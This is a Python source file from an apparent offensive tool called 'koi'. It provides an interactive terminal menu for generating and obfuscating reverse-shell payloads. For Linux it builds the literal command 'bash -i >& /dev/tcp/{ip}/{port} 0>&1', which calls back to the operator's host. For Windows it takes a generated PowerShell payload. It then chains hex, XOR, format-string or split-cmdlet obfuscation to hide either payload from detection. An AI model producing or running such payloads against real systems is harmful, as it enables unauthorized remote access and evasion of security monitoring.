from __future__ import annotations

import os
import select
import sys
import shutil
import termios
import tty
from typing import Callable

from koi.utils.bash_obfuscate import METHODS as LINUX_METHODS
from koi.utils.payloads import get_interfaces, PayloadGenerator
from koi.utils.ps_obfuscate import (
    _ps_hex_obfuscate,
    _ps_syntax_obfuscate,
    _ps_format_obfuscate,
    _ps_xor_obfuscate,
)
from koi.utils.ui import (
    _b, _p, _d, _gr, _c,
    gradient_text,
    PUMPKIN, CORAL,
    notify,
)

WIN_METHODS: list[tuple[str, str, Callable[[str], str]]] = [
    ("hex",    "hex byte array encoding",           _ps_hex_obfuscate),
    ("syntax", "cmdlet name split concatenation",   _ps_syntax_obfuscate),
    ("format", "-f string format interpolation",    _ps_format_obfuscate),
    ("xor",    "XOR encoding with random key",      _ps_xor_obfuscate),
]

_HIDE    = "\033[?25l"
_SHOW    = "\033[?25h"
_ALT_ON  = "\033[?1049h"
_ALT_OFF = "\033[?1049l"
_CLEAR   = "\033[2J\033[H"


def _getch() -> bytes:
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = os.read(fd, 1)
        if ch == b'\x1b':
            r, _, _ = select.select([sys.stdin], [], [], 0.05)
            if r:
                ch += os.read(fd, 2)
        return ch
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)


def _render_menu(title: str, options: list[str], cursor: int) -> None:
    sys.stdout.write(_CLEAR)
    sys.stdout.write("\n")
    sys.stdout.write("  " + gradient_text(title, PUMPKIN, CORAL) + "\n\n")
    for i, opt in enumerate(options):
        if i == cursor:
            sys.stdout.write(f"  {_p('►')} {_b(_p(opt))}\n")
        else:
            sys.stdout.write(f"    {_d(opt)}\n")
    sys.stdout.write(f"\n  {_d('↑/↓')} navigate  {_d('Enter')} select  {_d('q')} cancel\n")
    sys.stdout.flush()


def _render_obfuscator(
    title: str,
    payload: str,
    chain: list[str],
    cursor: int,
    methods: list[tuple[str, str, Callable]],
) -> None:
    cols = max(shutil.get_terminal_size().columns, 60)
    indent = "  "
    chunk_w = cols

    sys.stdout.write(_CLEAR)
    sys.stdout.write("\n")
    sys.stdout.write(indent + gradient_text(title, PUMPKIN, CORAL) + "\n\n")

    chunks = [payload[i:i + chunk_w] for i in range(0, len(payload), chunk_w)]
    sys.stdout.write(_gr("─" * cols + "\n"))
    for line in chunks[:15]:
        sys.stdout.write(f"{_d(line)}\n")
    if len(chunks) > 15:
        extra = len(payload) - 15 * chunk_w
        sys.stdout.write(f"{_gr(f'... +{extra} chars')}\n")
    sys.stdout.write(_gr("─" * cols + "\n\n"))

    if chain:
        sys.stdout.write(f"{indent}Chain: {' & '.join(_p(m) for m in chain)}\n\n")
    else:
        sys.stdout.write(f"{indent}Chain: {_d('none')}\n\n")

    sys.stdout.write(indent + _gr("Methods:") + "\n")
    name_w = max(len(n) for n, _, _ in methods) + 2
    for i, (name, desc, _) in enumerate(methods):
        if i == cursor:
            sys.stdout.write(f"  {_p('►')} {_b(_p(f'{name:<{name_w}}'))} {_d(desc)}\n")
        else:
            sys.stdout.write(f"    {_c(f'{name:<{name_w}}')} {_d(desc)}\n")

    sys.stdout.write(
        f"\n{indent}{_d('↑/↓')} navigate  "
        f"{_d('Enter')} apply  "
        f"{_d('r')} reset  "
        f"{_d('q')} quit & print\n"
    )
    sys.stdout.flush()


def _run_obfuscator_loop(
    title: str,
    label: str,
    base: str,
    methods: list[tuple[str, str, Callable]],
) -> tuple[str, list[str]]:
    """Run the interactive obfuscator. Returns (final_payload, chain)."""
    current = base
    chain: list[str] = []
    cursor = 0

    while True:
        _render_obfuscator(title, current, chain, cursor, methods)
        ch = _getch()

        if ch == b'\x1b[A':
            cursor = (cursor - 1) % len(methods)
        elif ch == b'\x1b[B':
            cursor = (cursor + 1) % len(methods)
        elif ch in (b'\r', b'\n'):
            _, _, fn = methods[cursor]
            current = fn(current)
            chain.append(methods[cursor][0])
        elif ch in (b'r', b'R'):
            current = base
            chain = []
        elif ch in (b'q', b'Q', b'\x03', b'\x04'):
            break

    return current, chain


class _Cancelled(Exception):
    pass


def run_obfuscate_ui(iface: str | None, port: int) -> None:
    interfaces = get_interfaces()
    if not interfaces:
        notify('error', "No network interfaces found.")
        return

    if iface and iface in interfaces:
        selected_iface = iface
    elif len(interfaces) == 1:
        selected_iface = next(iter(interfaces))
    else:
        selected_iface = None

    final_payload = ""
    final_chain: list[str] = []
    final_label = ""

    sys.stdout.write(_ALT_ON + _HIDE)
    sys.stdout.flush()
    try:
        if selected_iface is None:
            iface_names = list(interfaces.keys())
            iface_cursor = 0
            while True:
                _render_menu("Obfuscate Select Interface", iface_names, iface_cursor)
                ch = _getch()
                if ch == b'\x1b[A':
                    iface_cursor = (iface_cursor - 1) % len(iface_names)
                elif ch == b'\x1b[B':
                    iface_cursor = (iface_cursor + 1) % len(iface_names)
                elif ch in (b'\r', b'\n'):
                    selected_iface = iface_names[iface_cursor]
                    break
                elif ch in (b'q', b'Q', b'\x03'):
                    raise _Cancelled

        ip = interfaces[selected_iface]
        gen = PayloadGenerator(port)

        os_cursor = 0
        while True:
            _render_menu("Obfuscate Select Platform", ["Windows", "Linux"], os_cursor)
            ch = _getch()
            if ch == b'\x1b[A':
                os_cursor = (os_cursor - 1) % 2
            elif ch == b'\x1b[B':
                os_cursor = (os_cursor + 1) % 2
            elif ch in (b'\r', b'\n'):
                break
            elif ch in (b'q', b'Q', b'\x03'):
                raise _Cancelled

        if os_cursor == 0:
            base = gen.for_interface(selected_iface)["powershell"]
            final_payload, final_chain = _run_obfuscator_loop(
                "Windows Payload Obfuscator", "powershell", base, WIN_METHODS
            )
            final_label = "powershell"
        else:
            base = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            final_payload, final_chain = _run_obfuscator_loop(
                "Linux Payload Obfuscator", "bash", base, LINUX_METHODS
            )
            final_label = "bash"

    except _Cancelled:
        pass
    finally:
        sys.stdout.write(_SHOW + _ALT_OFF + "\n")
        sys.stdout.flush()

    if not final_payload:
        return

    label = final_label + " with " + " → ".join(final_chain) if final_chain else final_label
    print(f"Final obfuscated payload ({_p(label)}):\n")
    print(final_payload)
    print("\n\n")
